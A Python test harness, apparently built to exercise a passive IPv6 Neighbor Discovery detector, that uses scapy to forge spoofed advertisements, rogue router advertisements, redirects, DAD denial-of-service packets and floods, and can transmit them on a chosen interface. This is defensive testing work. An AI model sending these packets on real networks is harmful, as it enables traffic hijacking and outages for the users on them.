#!/usr/bin/env python3
"""ndp_inject.py — LAB-ONLY adversarial IPv6 Neighbor Discovery generator.

**Not part of ndpwatch.** ndpwatch is passive and has no transmit primitives;
this is a separate file precisely so that invariant stays intact. It TRANSMITS
forged ND on one named interface to prove the passive detector fires on real
on-wire attacks — meant only for the throwaway namespaces `ndpwatch-lab.sh`
creates (an isolated bridge with no path to any real network). NEVER point it at
a production segment.

Each scenario maps to the `NDP-0xx` code(s) it must produce (against the lab's
pinned gateway/prefix baseline). `--dry-run` builds the packets and runs them
back through the real ndpwatch parser+engine — the offline conformance path
`conftest_packets.py` uses — with no transmit and no interface.
"""

import argparse
import sys

# Lab identities — must match ndpwatch-lab.sh's pinned gateway + prefix.
GW_IP, GW_MAC = 'fe80::1', '02:00:00:00:00:01'
VIC_IP, VIC_MAC = '2001:db8:0:1::5', 'aa:aa:aa:00:00:05'
ATK_IP, ATK_MAC = 'fe80::66', 'de:ad:be:ef:00:66'
GOOD_PFX, BAD_PFX = '2001:db8:0:1::', '2001:db8:bad::'

LAB_CONFIG = {'trusted_routers': [GW_IP, GW_MAC],
              'trusted_prefixes': [GOOD_PFX + '/64'],
              'flap_count': 3, 'na_override_count': 8, 'ra_flood_count': 10,
              'rs_flood_count': 20, 'ns_sweep_count': 20, 'dad_defend_count': 3}


def _scapy():
    from scapy.all import Ether, IPv6
    from scapy.all import (ICMPv6ND_NA, ICMPv6ND_NS, ICMPv6ND_RA, ICMPv6ND_RS,
                           ICMPv6ND_Redirect, ICMPv6NDOptDstLLAddr,
                           ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo,
                           ICMPv6NDOptMTU, ICMPv6NDOptRDNSS)
    return locals()


# --- scenario builders: each returns a list of scapy packets ----------------
def _b(S, name):
    E, I = S['Ether'], S['IPv6']
    builders = {}

    def na(target, ip_src, mac, tlla=True, O=1, R=0, hlim=255, dst='ff02::1'):
        p = E(src=mac) / I(src=ip_src, dst=dst, hlim=hlim) / S['ICMPv6ND_NA'](tgt=target, R=R, S=0, O=O)
        if tlla:
            p /= S['ICMPv6NDOptDstLLAddr'](lladdr=mac)
        return p

    def ns(target, ip_src, mac, hlim=255):
        return E(src=mac) / I(src=ip_src, dst='ff02::1:ff00:5', hlim=hlim) / S['ICMPv6ND_NS'](tgt=target)

    def ra(ip_src, mac, lifetime=1800, prf=0, opts=None, hlim=255):
        p = E(src=mac) / I(src=ip_src, dst='ff02::1', hlim=hlim) / S['ICMPv6ND_RA'](routerlifetime=lifetime, prf=prf)
        for o in (opts or []):
            p /= o
        return p

    def rs(ip_src, mac, hlim=255):
        return E(src=mac) / I(src=ip_src, dst='ff02::2', hlim=hlim) / S['ICMPv6ND_RS']()

    def redirect(ip_src, mac, hlim=255):
        return E(src=mac) / I(src=ip_src, dst=VIC_IP, hlim=hlim) / S['ICMPv6ND_Redirect'](tgt=ATK_IP, dst='2001:db8::9')

    PIO_GOOD = S['ICMPv6NDOptPrefixInfo'](prefix=GOOD_PFX, prefixlen=64)
    PIO_BAD = S['ICMPv6NDOptPrefixInfo'](prefix=BAD_PFX, prefixlen=64)
    MTU_LOW = S['ICMPv6NDOptMTU'](mtu=1200)
    RDNSS_BAD = S['ICMPv6NDOptRDNSS'](dns=[BAD_PFX + '53'])

    builders['na-spoof'] = (['NDP-001'], lambda: [
        na(VIC_IP, VIC_IP, VIC_MAC), na(VIC_IP, ATK_IP, ATK_MAC)])
    builders['na-override-flood'] = (['NDP-002'], lambda: (
        [na(VIC_IP, VIC_IP, VIC_MAC)] + [na(VIC_IP, ATK_IP, ATK_MAC) for _ in range(9)]))
    builders['na-flap'] = (['NDP-003'], lambda: [
        na(VIC_IP, VIC_IP, VIC_MAC), na(VIC_IP, ATK_IP, ATK_MAC),
        na(VIC_IP, VIC_IP, VIC_MAC), na(VIC_IP, ATK_IP, ATK_MAC)])
    builders['na-router-flip'] = (['NDP-004'], lambda: [
        na(GW_IP, GW_IP, GW_MAC, R=1), na(GW_IP, GW_IP, GW_MAC, R=0)])
    builders['lla-mismatch'] = (['NDP-005'], lambda: [
        _lla_mismatch(S, na)])
    builders['rogue-ra'] = (['NDP-006', 'NDP-020'], lambda: [ra(ATK_IP, ATK_MAC, opts=[PIO_GOOD])])
    builders['ra-demotion'] = (['NDP-007'], lambda: [ra(GW_IP, GW_MAC, lifetime=0, opts=[PIO_GOOD])])
    builders['ra-prefix'] = (['NDP-008'], lambda: [ra(GW_IP, GW_MAC, opts=[PIO_BAD])])
    builders['ra-pref-high'] = (['NDP-009'], lambda: [ra(ATK_IP, ATK_MAC, prf=1, opts=[PIO_GOOD])])
    builders['ra-rdnss'] = (['NDP-010'], lambda: [ra(ATK_IP, ATK_MAC, opts=[PIO_GOOD, RDNSS_BAD])])
    builders['ra-mtu'] = (['NDP-011'], lambda: [ra(GW_IP, GW_MAC, opts=[PIO_GOOD, MTU_LOW])])
    builders['ra-flood'] = (['NDP-012'], lambda: [ra(ATK_IP, ATK_MAC) for _ in range(11)])
    builders['ns-sweep'] = (['NDP-013'], lambda: [
        ns('2001:db8::%d' % (i + 1), ATK_IP, ATK_MAC) for i in range(21)])
    builders['dad-dos'] = (['NDP-014'], lambda: (
        [ns('2001:db8::dad', '::', VIC_MAC)] +
        [na('2001:db8::dad', ATK_IP, ATK_MAC) for _ in range(4)]))
    builders['rs-flood'] = (['NDP-015'], lambda: [
        rs('fe80::%d' % (i + 10), 'aa:aa:aa:00:%02x:05' % i) for i in range(21)])
    builders['redirect'] = (['NDP-016'], lambda: [redirect(ATK_IP, ATK_MAC)])
    builders['bad-hoplimit'] = (['NDP-017'], lambda: [na(VIC_IP, ATK_IP, ATK_MAC, hlim=64)])
    return builders


def _lla_mismatch(S, na):
    # NA whose TLLA option carries a MAC different from the Ethernet source.
    p = na('2001:db8::7', ATK_IP, ATK_MAC, tlla=False)
    p /= S['ICMPv6NDOptDstLLAddr'](lladdr='11:11:11:11:11:11')
    return p


def scenarios():
    return _b(_scapy(), None)


def build(name):
    b = scenarios()
    if name not in b:
        raise SystemExit('unknown scenario: %s (see --list)' % name)
    codes, fn = b[name]
    return codes, fn()


def main(argv=None):
    ap = argparse.ArgumentParser(description='LAB-ONLY adversarial IPv6 ND generator.')
    ap.add_argument('--iface', help='TX interface (a lab namespace veth only)')
    ap.add_argument('--scenario', help='attack scenario name')
    ap.add_argument('--list', action='store_true', help='list scenarios + their codes')
    ap.add_argument('--dry-run', action='store_true',
                    help='build + run through the real ndpwatch parser; do NOT transmit')
    ap.add_argument('--all', action='store_true', help='(dry-run) run every scenario')
    args = ap.parse_args(argv)

    if args.list:
        for name, (codes, _fn) in sorted(scenarios().items()):
            print('%-18s -> %s' % (name, ', '.join(codes)))
        return 0

    names = sorted(scenarios()) if args.all else ([args.scenario] if args.scenario else [])
    if not names:
        ap.error('--scenario NAME (or --all / --list) required')

    if args.dry_run or args.all:
        sys.path.insert(0, __import__('os').path.dirname(__import__('os').path.abspath(__file__)))
        import ndpwatch as n
        rc = 0
        for name in names:
            codes, pkts = build(name)
            fired = set()
            g = n.NdpWatch(LAB_CONFIG, emit=lambda a: fired.update(a['codes']))
            for i, p in enumerate(pkts):
                g.process_packet(bytes(p), ts=100 + i * 0.1)
            ok = all(c in fired for c in codes)
            rc |= 0 if ok else 1
            print('%-18s %s expect=%s fired=%s' % (name, 'OK ' if ok else 'FAIL',
                  codes, sorted(fired)))
        return rc

    if not args.iface:
        ap.error('--scenario needs --iface to transmit (or use --dry-run)')
    from scapy.all import sendp
    codes, pkts = build(args.scenario)
    print('[inject] %s (%s) x%d on %s' % (args.scenario, ','.join(codes), len(pkts), args.iface))
    sendp(pkts, iface=args.iface, verbose=False)
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
